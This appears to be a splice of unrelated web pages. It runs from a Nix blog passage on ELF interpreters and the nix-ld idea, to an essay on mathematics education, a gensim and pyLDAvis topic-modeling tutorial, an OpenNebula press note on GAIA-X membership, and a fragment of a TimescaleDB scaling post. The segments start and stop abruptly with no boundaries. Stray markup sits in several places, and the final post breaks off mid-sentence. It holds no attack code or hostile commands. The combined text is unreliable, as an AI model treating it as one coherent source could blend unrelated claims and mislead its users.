<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>I’m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>❯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Let’s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>❯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreter’s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>⚠️ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>“bad ELF interpreter: No such file or directory”</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>💡 Let’s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. 🤪</p>

<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> – a files database for nixpkgs – to locate packages in Nix that provide the necessary library. 🤯</p>

<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! 😱</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light 😇</p>

<p><em>Revised October 23 based on comments on <a href="https://news.ycombinator.com/item?id=4679539">Hacker News</a> and <a href="http://www.reddit.com/r/math/comments/11sw82/the_unreasonable_ineffectiveness_of_mathematics/">Reddit</a>.</em></p>
<p>In American schools, mathematics is taught as a dark art. Learn these sacred methods and you will become master of the ancient symbols. You must memorize the techniques to our satisfaction or your performance on the state standardized exams will be so poor that they will be forced to lower the passing grades. Never mind the foundational principles, proofs, or derivations – you’ll learn those in due course.</p>
<p>Why? Why do math? Because you’ll <em>need</em> it, that’s why. You’ll use it in your physics classes. And I’m sure I can think of examples of how you’ll use math in “real life”, whatever your chosen career may be. Right? Right. I hear engineers have to know how to solve differential equations, for example, and before you can do differential equations you need to learn logarithms. So get back to chapter 14 and get working.</p>
<p>This is the message we’re giving our children, and it’s no wonder so few students develop an interest in mathematics. Ask any math major: Math isn’t about memorizing some formulas and learning how to factor polynomials. It’s… well, it’s something much deeper. It’s fascinating. But what is it exactly?</p>
<section id="rules-rules-rules">

<p>The universe appears to work on rules. Gravity tends to pull us to the Earth in the same way every day. Light has behaved exactly the same way for millions of years. Objects in motion tend to stay in motion unless acted upon by an external force. Magnets and electricity obey the same laws now as they did in the 1860s, when Maxwell discovered the laws.</p>
<p>Much of the human world obeys rules as well. Interest and fees accumulate in bank accounts according to rules set down in extremely small font on pieces of paper immediately discarded by account-holders. Internet traffic piles up in buffers and gets routed to its destination according to complicated sets of standards. Engine control modules execute millions of lines of code to read sensor data and process the driver’s instructions to keep pistons flailing in low-emissions synchrony. Aircraft autopilots use clever mathematical algorithms to decide how to keep long metal tubes with wings from falling out of the sky.</p>
<p>I could go on, but you get the idea. Many things follow predictable sets of rules. How can we precisely express these rules in a useful way?</p>
<p>We could use English (or Spanish, or whatever chosen language), but languages are notoriously ambiguous and tricky to work with. It would take many pages to precisely describe Maxwell’s equations of electrodynamics in English, and more importantly, the result would be impossible to work with.</p>
<p>After all, once the rules are set down you’d like to put them to use: make predictions about the behavior of reality, invent new devices, or calculate how many more boxes of ramen noodles you can afford before your paycheck arrives.</p>
<p>How do I move from <em>general</em> rules about the world to <em>specific</em> rules that describe what will happen in one particular situation? With rules written in English, I’m limited to one method:<a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<ol type="1">
<li>Write down the rules and the situation.</li>
<li>Think very hard.</li>
<li>Write down the answer.</li>
</ol>
<p>There’s no system by which I manipulate a rule written in English and arrive at new facts about a specific situation. If I gave you a Monopoly rulebook, could you deduce the best properties to invest in, based on the expected likelihood of a player landing on each property? (If you must resort to written mathematics, you have proved my point.)</p>
<p>Rules aren’t useful if we can’t use them. Fortunately, we have mathematics.</p>
</section>
<section id="math-is-just-a-bunch-of-lego-bricks">

<p>Forget the mathematics you learned in school. Let’s think of mathematics in the abstract. Mathematics, at its most basic, is a very simple set of very well-defined rules. The rules describe the behavior and interaction of certain completely imaginary objects. Upon these rules, mathematicians have built others. By combining rules, mathematicians demonstrate certain facts about these imaginary objects: when certain objects are arranged in certain ways, the rules show they must have certain properties.</p>
<p>On top of all these rules mathematicians have built a universe. Inhabiting this universe are various objects – tensors, matrices, groups, Hilbert spaces, ordinary numbers, complex numbers, and so on and so forth – which are defined by mathematicians by the sets of rules they follow. Many of these rules are in fact defined in terms of combinations of much simpler rules. If a mathematician wishes to know how a certain mathematical object behaves under certain circumstances, he must simply apply the simple rules in creative ways to discover what <em>must</em> be true.</p>
<p>It’s much like being handed an extraordinarily large and complex Lego brick creation and figuring out what it does and how it works. Lego bricks are exceedingly simple, and you understand exactly how they work. The ungainly creation you’ve been given is made of Lego bricks, so you must simply take what you know about individual bricks and work out what happens when they’re put together. Soon enough you sort out what the stubby-looking bit on the left side does, and you no longer have to worry about the individual bricks: you just know that it’s a frobnulator, and now you understand how frobnulators work. Eventually, with much work, you can deduce what the entire machine does, and write down a set of rules describing its behavior. You can forget about the individual bricks and worry only about the entire creation.</p>
<p>Objects of mathematical construction are much the same, although they are much less painful to step on.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
</section>
<section id="glued-legos">

<p>High school mathematics doesn’t focus on the very basic rules and constructions of mathematics; they are very abstract, rigorously defined, and difficult to connect to physical reality. Our curriculum instead focuses on certain constructions that relate to reality. Geometry, for instance, is based on a very basic set of rules, but allows us to prove facts about real objects in three-dimensional space. A clever mathematician can wield the rules and basic facts to learn about all sorts of complicated shapes without ever leaving the two-dimensional world of a sheet of paper.</p>
<p>But that skill is not taught in high school. School mathematics is about memorizing the constructed mathematical objects, not learning how to wield the simple rules to build new objects and dissect their behavior.</p>
<p>High school mathematics, then, is much like being given a set of Lego airplanes which have been carefully glued together. You may learn how they work, but you do not have the tools to disassemble them and you haven’t the faintest idea how to build a new one. Should you ever meet these airplanes again, your knowledge will be useful; otherwise, what’s the point? It’s just like an 8th-grader complaining that he’ll never use the quadratic equation again in his life.</p>
<p>But what can you do with the basic rules of mathematics? Why do we care?</p>
<p>We’ve already discussed how many familiar parts of reality appear to follow rules. For many, like electromagnetism, we have no idea how the universe “knows” to follow these rules or why it must use these rules and not some other set. But we <em>can</em> construct complicated mathematical objects that in some ways are exactly analogous to physical objects. We can construct a mathematical object which represents an electric field, specify the rules it operates by, and use the rules to sort out what happens when a mathematical object representing an electron wanders by.</p>
<p>Or we could devise mathematical rules to represent the wobbling behavior of a plate spun and thrown in the air.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
<p>Or we could devise rules describing the grip of a car tire on a road surface in different atmospheric conditions.</p>
<p>Or rules describing how furniture can be arranged in the available space of your living room.</p>
<p>Or rules describing your retirement plan.</p>
<p>Or rules describing… well, anything you can think of that seems to follow rules. Perhaps mathematicians haven’t yet devised mathematical objects that behave in the right ways, or perhaps they have but do not understand how to manipulate them. Perhaps you can write down a set of rules but it’s so horribly complicated that it would take a computer years to determine what will happen ten seconds after you flip a switch. But the rules exist, and mathematics, one way or another, can probably describe them.</p>
<p>Some justify mathematics education as a way to teach students to think critically; that’s good, but they could also analyze essays and literature or study logic for that. We should not teach our students so they can be human calculators and perform simple arithmetic; that is important, but it is hardly the most useful part of mathematics.</p>
<p>We should teach our students mathematics because they can use it to describe reality. They can use it to discover facts about the universe. Facts about their retirement funds, their living rooms, and the rate of fish food consumption in their fish tanks.</p>
<p>Mathematics is a tool to explore reality. We should teach our students to use it.</p>

<p>Have you ever wanted to classify news, papers, or tweets based on their topics? Knowing how to do this can help you filter out irrelevant documents, and save time by reading only what you’re interested in.</p>



<p>That’s what text classification is for – allows you to train your model to recognize topics. This technique allows you to use data labels to train your model, and it’s supervised learning.</p>



<div><figure><img loading="lazy" width="461" height="200" src="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=461%2C200&amp;ssl=1" alt="text classification" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?w=461&amp;ssl=1 461w, https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=300%2C130&amp;ssl=1 300w" sizes="(max-width: 461px) 100vw, 461px" data-recalc-dims="1"></figure></div>



<p>In real life, you might not have data labels for text classification. You can go through each document to label them, or hire somebody else to do it, but that’s a lot of time and money, especially when you have more than 1000 data points.</p>



<p>Can you find the topics of your documents without training data? Yes, you can use topic modeling to do it.</p>






<h2>What is topic modeling?</h2>



<p>With <a href="https://towardsdatascience.com/end-to-end-topic-modeling-in-python-latent-dirichlet-allocation-lda-35ce4ed6b3e0" target="_blank" rel="noreferrer noopener nofollow">topic modeling</a>, you can cluster words for a set of documents. This is unsupervised learning, because it automatically groups words without a predefined list of labels.</p>



<p>If you feed the model data, it will give you different sets of words, and each set of words describes the topic.</p>



<pre>(<span>0</span>, <span>'0.024*</span><span>"ban"</span> + <span>0.017</span>*<span>"order"</span> + <span>0.015</span>*<span>"refugee"</span> + <span>0.015</span>*<span>"law"</span> + <span>0.013</span>*<span>"trump"</span> '
 <span>'+</span> <span>0.011</span>*<span>"kill"</span> + <span>0.011</span>*<span>"country"</span> + <span>0.010</span>*<span>"attack"</span> + <span>0.009</span>*<span>"state"</span> + '
 <span>'0.009*</span><span>"immigration"</span>')
(<span>1</span>, <span>'0.020*</span><span>"student"</span> + <span>0.020</span>*<span>"work"</span> + <span>0.019</span>*<span>"great"</span> + <span>0.017</span>*<span>"learn"</span> + '
  <span>'0.017*</span><span>"school"</span> + <span>0.015</span>*<span>"talk"</span> + <span>0.014</span>*<span>"support"</span> + <span>0.012</span>*<span>"community"</span> + '
  <span>'0.010*</span><span>"share"</span> + <span>0.009</span>*<span>"event"</span>)</pre>



<p>When you look at the first set of words, you would guess the topic is military and politics.&nbsp;Looking at the second set of words, you might guess the topic is public events, or school.</p>



<p>This is quite useful. Your texts are automatically categorized, without the need to label them!</p>






<h2>Visualize topic modeling with pyLDAvis</h2>



<p>Topic modeling is useful, but it’s difficult to understand it just by looking at a combination of words and numbers like above.</p>



<p>One of the most effective ways to understand data is through visualization. Is there a way that we can visualize the results of LDA? Yes, we can with<a href="https://github.com/bmabey/pyLDAvis" target="_blank" rel="noreferrer noopener nofollow"> pyLDAvis</a>.</p>



<p>PyLDAvis allows us to interpret the topics in a topic model like below:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis " srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=300%2C182&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Pretty cool, isn’t it? <strong>Now we will learn how to use topic modeling and pyLDAvis to categorize tweets and visualize the results. We’ll analyze </strong><a href="https://datapane.com/u/khuyentran1401/reports/tweets/" target="_blank" rel="noreferrer noopener nofollow"><strong>a real Twitter dataset containing 6000 tweets.</strong></a>&nbsp;</p>



<p>Let’s see what topics we can find.</p>



<figure></figure>






<h2>How to start with pyLDAvis and how to use it</h2>



<p>Install pyLDAvis with:</p>



<pre>pip install pyldavis</pre>



<p>The script to process the data can be found <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/ac75203d-2de0-4bbf-a559-ec7763d919d8/e7960ea4-c002-4ea6-949f-8964c1e33491" target="_blank" rel="noreferrer noopener nofollow">here</a>. Download the <a href="https://datapane.com/u/khuyentran1401/reports/processed_tweets/" target="_blank" rel="noreferrer noopener nofollow">data after being processed</a>.</p>



<p>Moving on, let’s import relevant libraries:</p>



<pre><span>import</span> gensim
<span>import</span> gensim.corpora <span>as</span> corpora
<span>from</span> gensim.corpora <span>import</span> Dictionary
<span>from</span> gensim.models.coherencemodel <span>import</span> CoherenceModel
<span>from</span> gensim.models.ldamodel <span>import</span> LdaModel

<span>from</span> pprint <span>import</span> pprint

<span>import</span> spacy

<span>import</span> pickle
<span>import</span> re 
<span>import</span> pyLDAvis
<span>import</span> pyLDAvis.gensim

<span>import</span> matplotlib.pyplot <span>as</span> plt 
<span>import</span> pandas <span>as</span> pd</pre>



<p>If you want to get access to the data above and follow along with the article, download the data and put the data in your current directory, then run:</p>



<pre>tweets = pd.read_csv(<span>'dp-export-8940.csv'</span>) 
tweets = tweets.Tweets.values.tolist()


tweets = [t.split(<span>','</span>) <span>for</span> t <span>in</span> tweets]</pre>






<h2>How to use LDA Model</h2>



<p>Topic modeling involves counting words and grouping similar word patterns to describe topics within the data. If the model knows the word frequency, and which words often appear in the same document, it will discover patterns that can group different words together.</p>



<p>We start with converting a collection of words to a bag of words, which is a list of tuples (word_id, word_frequency). <strong>gensim.corpora.Dictionary</strong> is a great tool for this:</p>



<pre>id2word = Dictionary(tweets)

corpus = [id2word.doc2bow(text) <span>for</span> text <span>in</span> tweets]
print(corpus[:<span>1</span>])

[[(<span>0</span>, <span>1</span>), (<span>1</span>, <span>1</span>), (<span>2</span>, <span>1</span>), (<span>3</span>, <span>3</span>), (<span>4</span>, <span>1</span>), (<span>5</span>, <span>2</span>), (<span>6</span>, <span>2</span>), (<span>7</span>, <span>1</span>), (<span>8</span>, <span>1</span>), (<span>9</span>, <span>1</span>), (<span>10</span>, <span>1</span>), (<span>11</span>, <span>2</span>), (<span>12</span>, <span>2</span>), (<span>13</span>, <span>1</span>), (<span>14</span>, <span>1</span>), (<span>15</span>, <span>1</span>), (<span>16</span>, <span>2</span>), (<span>17</span>, <span>1</span>), (<span>18</span>, <span>1</span>), (<span>19</span>, <span>1</span>), (<span>20</span>, <span>2</span>), (<span>21</span>, <span>1</span>), (<span>22</span>, <span>1</span>), (<span>23</span>, <span>1</span>), (<span>24</span>, <span>1</span>), (<span>25</span>, <span>2</span>), (<span>26</span>, <span>1</span>), (<span>27</span>, <span>1</span>), (<span>28</span>, <span>1</span>), (<span>29</span>, <span>1</span>), (<span>30</span>, <span>1</span>), (<span>31</span>, <span>1</span>), (<span>32</span>, <span>1</span>), ... , (<span>347</span>, <span>1</span>), (<span>348</span>, <span>1</span>), (<span>349</span>, <span>2</span>), (<span>350</span>, <span>1</span>), (<span>351</span>, <span>1</span>), (<span>352</span>, <span>1</span>), (<span>353</span>, <span>1</span>), (<span>354</span>, <span>1</span>), (<span>355</span>, <span>1</span>), (<span>356</span>, <span>1</span>), (<span>357</span>, <span>1</span>), (<span>358</span>, <span>1</span>), (<span>359</span>, <span>1</span>), (<span>360</span>, <span>1</span>), (<span>361</span>, <span>1</span>), (<span>362</span>, <span>2</span>), (<span>363</span>, <span>1</span>), (<span>364</span>, <span>4</span>), (<span>365</span>, <span>1</span>), (<span>366</span>, <span>1</span>), (<span>367</span>, <span>3</span>), (<span>368</span>, <span>1</span>), (<span>369</span>, <span>8</span>), (<span>370</span>, <span>1</span>), (<span>371</span>, <span>1</span>), (<span>372</span>, <span>1</span>), (<span>373</span>, <span>4</span>)]]</pre>



<p>What do these tuples mean? Let’s convert them into human readable format to understand:</p>



<pre>[[(id2word[i], freq) <span>for</span> i, freq <span>in</span> doc] <span>for</span> doc <span>in</span> corpus[:<span>1</span>]]

[[(<span>"'d"</span>, <span>1</span>),

  (<span>'affordable'</span>, <span>1</span>),
  (<span>'allow'</span>, <span>1</span>),
  (<span>'amazing'</span>, <span>1</span>),
...
  (<span>'way'</span>, <span>4</span>),
  (<span>'week'</span>, <span>1</span>),
  (<span>'well'</span>, <span>1</span>),

  (<span>'writing'</span>, <span>1</span>),
  (<span>'wrong'</span>, <span>1</span>),
  (<span>'year'</span>, <span>4</span>)]]</pre>



<p>Now let’s build an LDA topic model. We will use <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel" target="_blank" rel="noreferrer noopener nofollow">gensim.models.ldamodel.LdaModel</a> for this:</p>



<pre>
lda_model = LdaModel(corpus=corpus,
                   id2word=id2word,
                   num_topics=<span>10</span>, 
                   random_state=<span>0</span>,
                   chunksize=<span>100</span>,
                   alpha=<span>'auto'</span>,
                   per_word_topics=<span>True</span>)

pprint(lda_model.print_topics())
doc_lda = lda_model[corpus]
</pre>



<p>There seem to be some <strong>patterns</strong> here. The first topic may be politics, and the second topic may be sport, but the pattern is not clear.</p>

</pre>



<p>Let’s use pyLDAvis to visualize the topics:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis visualization" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Click <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/Topic-modeling-b25db361-8995-42ee-bd50-6f03fa8d5847/65d94d91-43e9-4c21-bee6-8a9bf7584087#ldavis_el55571398076541038884947444595" target="_blank" rel="noreferrer noopener nofollow">here</a> to interact with the visualization yourself.</p>



<ul><li>Each bubble represents a topic. The larger the bubble, the higher percentage of the number of tweets in the corpus is about that topic.</li><li>Blue bars represent the overall frequency of each word in the corpus. If no topic is selected, the blue bars of the most frequently used words will be displayed.</li><li>Red bars give the estimated number of times a given term was generated by a given topic. As you can see from the image below, there are about 22,000 of the word ‘go’, and this term is used about 10,000 times within topic 1. The word with the longest red bar is the word that is used the most by the tweets belonging to that topic.</li></ul>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=596%2C648&amp;ssl=1" alt="PyLDAvis visualization" width="596" height="648" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?w=794&amp;ssl=1 794w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=276%2C300&amp;ssl=1 276w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=768%2C836&amp;ssl=1 768w" sizes="(max-width: 596px) 100vw, 596px" data-recalc-dims="1"></figure></div>



<ul><li>The further the bubbles are away from each other, the more different they are. For example, it is difficult to tell the difference between topics 1 and 2. They seem to be both about social life, but it is much easier to tell the difference between topics 1 and 3. We can tell that topic 3 is about politics.</li></ul>



<div><figure><img loading="lazy" width="613" height="651" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=613%2C651&amp;ssl=1" alt="pyLDAvis visualization" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?w=613&amp;ssl=1 613w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=282%2C300&amp;ssl=1 282w" sizes="(max-width: 613px) 100vw, 613px" data-recalc-dims="1"></figure></div>



<p>A good topic model will have big and non-overlapping bubbles scattered throughout the chart. As we can see from the graph, the bubbles are clustered within one place. Can we do better than this?</p>



<p>Yes, because luckily, there is a better model for topic modeling called LDA Mallet.</p>






<h2>How to use LDA Mallet Model</h2>



<p>Our model will be better if the words in a topic are similar, so we will use topic coherence to evaluate our model. Topic coherence evaluates a single topic by measuring the degree of semantic similarity between high scoring words in the topic. <strong>A good model will generate topics with high topic coherence scores.</strong></p>



<pre>
coherence_model_lda = CoherenceModel(model=lda_model, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_lda = coherence_model_lda.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_lda)

Coherence Score:  <span>0.3536443343685833</span>
</pre>



<p>This is our baseline. We have just used Gensim’s inbuilt version of the <a href="https://diging.github.io/tethne/api/tutorial.mallet.html" target="_blank" rel="noreferrer noopener nofollow">LDA algorithm</a>,&nbsp;but there is an LDA model that provides better quality of topics called the <a href="https://medium.com/swlh/topic-modeling-lda-mallet-implementation-in-python-part-2-602ffb38d396"><strong>LDA Mallet Model</strong></a>.</p>



<p><strong>Let’s see if we can do better with LDA Mallet.&nbsp;</strong></p>



<pre>mallet_path = <span>'patt/to/mallet-2.0.8/bin/mallet'</span> 
ldamallet = gensim.models.wrappers.LdaMallet(mallet_path, corpus=corpus, num_topics=<span>20</span>, id2word=id2word)


pprint(ldamallet.show_topics(formatted=<span>False</span>))


coherence_model_ldamallet = CoherenceModel(model=ldamallet, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_ldamallet = coherence_model_ldamallet.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_ldamallet)

Coherence Score:  <span>0.38780981858635866</span></pre>



<p><strong>The coherence score is better! </strong>Can the score be better if we increase or decrease the number of topics? Let’s find it out by fine-tuning the model. <a href="https://www.machinelearningplus.com/nlp/topic-modeling-gensim-python/#16buildingldamalletmodel" target="_blank" rel="noreferrer noopener nofollow">This tutorial</a> provides an excellent explanation of how to tune the LDA model.

<p>Back in June we already announced that <strong>OpenNebula</strong>, as part of its <a rel="noreferrer noopener" href="https://oneedge.io/" target="_blank">ONEedge</a> initiative—the EU-funded project to build the first open source Edge Computing platform in Europe—was <a href="https://opennebula.io/opennebula-contributes-to-gaia-x/">contributing to GAIA-X</a> with its expertise in distributed and federated cloud environments, hyperconverged cloud infrastructures, complex storage and virtual networking architectures, management and automation tools for large cloud deployments, and <strong>edge computing</strong>.</p>



<p>We are now delighted to confirm that <strong>OpenNebula Systems</strong> has joined this pan-European project as a <strong>Day-1 Member of the GAIA-X AISBL</strong> (in incorporation), the international non-profit association that is going to provide a formal structure to this initiative, coordinating the efforts of the GAIA-X Community, promoting international cooperation, and developing the necessary regulatory frameworks and rules to ensure the interoperability and reliability of the providers, services and data sources made available through GAIA-X. This announcement has taken place during the <a rel="noreferrer noopener" href="https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq" target="_blank">GAIA-X Summit</a> (Nov 18-19, 2020), an event that marks an important milestone for the project! 🚀</p>



<figure><video controls="" src="https://opennebula.io/wp-content/uploads/2020/11/GaiaX_Intro.mp4"></video></figure>



<p>🇪🇺 The <a rel="noreferrer noopener" href="https://www.data-infrastructure.eu/" target="_blank">GAIA-X project</a> supports the goals of the <a rel="noreferrer noopener" href="https://ec.europa.eu/info/strategy/priorities-2019-2024/europe-fit-digital-age/european-data-strategy_en" target="_blank">European data strategy</a>, which emphasizes the economic and social opportunities of data as well as European values and laws (e.g. GDPR). The common goal of the organizations joining the project is to create GAIA-X as a basis for a sovereign, European data infrastructure, which provides interoperability between different data creating and processing entities via federated services. One of our main tasks will be to make sure that <strong>OpenNebula</strong> Cloud Service Providers and Corporate Users can get the most out of the GAIA-X federated cloud infrastructure and of the resources that will be made available through this new <strong>European virtual hyperscaler</strong>.</p>



<div><p>The <strong>OpenNebula Webinar on GAIA-X</strong> that took place on September 8, 2020 is available on demand: <a href="https://opennebula.io/webinars">https://opennebula.io/webinars</a> Many thanks to our amazing guest speakers, <strong>Andreas Weiss</strong> (Director of EuroCloud Germany) and <strong>Mirko Lampe</strong> (Coordinator of GAIA-X Workstream 2—Technical Implementation).</p><p>We have created a <strong>GAIA-X Working Group</strong> within the OpenNebula Community, so <strong>Cloud Service Providers and Corporate Users</strong> interested in GAIA-X, or planning to join this initiative, please let us know by sending an email to <a href="https://opennebula.org/contact/">community@opennebula.io</a> 📡</p></div>

You can read the </span><a href="https://fltr.ai/2OOO" target="_blank" rel="noopener"><span>original blog</span></a><span> for all the details on why we transitioned to TimescaleDB in the first place, but the main thing we were after was reliability. We’re still using TimescaleDB, and unsurprisingly we’ve made a lot of changes to our infrastructure since that original post as our total users have continued to grow. Over the last 2 years we’ve worked to optimize TimescaleDB performance, and we’ve done it all </span><i><span>without</span></i><span> clustering.</span></p><h2><span>Expectation Vs. Reality</span></h2><p><span>In 2018, I made the prediction that we could get to 3B queries per day without major structural changes to our setup. I wasn’t quite wrong, but I wasn’t totally right either.&nbsp;</span></p><p><span>After going roughly 18 months without issues (with daily queries steadily growing), we hit over 1.2B for the first time in October of 2019. It was the first sign that the actual hardware supporting TimescaleDB would have trouble getting to 3B daily queries. The server had trouble keeping up with </span><a href="https://kafka.apache.org/" target="_blank" rel="noopener"><span>Kafka</span></a><span>, and the lag was </span><i><span>hours</span></i><span> long. We weren’t losing queries like we had previously with InfluxDB, but the disk I/O of our TimescaleDB server had trouble keeping up.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="9b23b4b" data-element_type="section"><div><div><div data-id="e8c98dd" data-element_type="column"><div><div><div data-id="208228a" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="329" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" alt="TimescaleDB Performance on our old server" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w"><figcaption>You can see the server struggle in October 2019 and then hit a temporary wall in March 2020.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="7d801f6" data-element_type="section"><div><div><div data-id="7902b84" data-element_type="column"><div><div><div data-id="3ec0127" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>We tweaked the ram usage in PostgreSQL and started to plan for a new approach.</span></p><p><span>At the time, this was just a spike in daily queries, but we knew we were approaching the moment where we would have to sustain over 1B queries daily. To help us out, we looked at setting up a virtual machine with </span><a href="https://www.digitalocean.com/" target="_blank" rel="noopener"><span>Digital Ocean</span></a><span>.</span></p><p><span>The original intention wasn’t to replace that server, it was just to take the load off of it. We wound up setting up 2 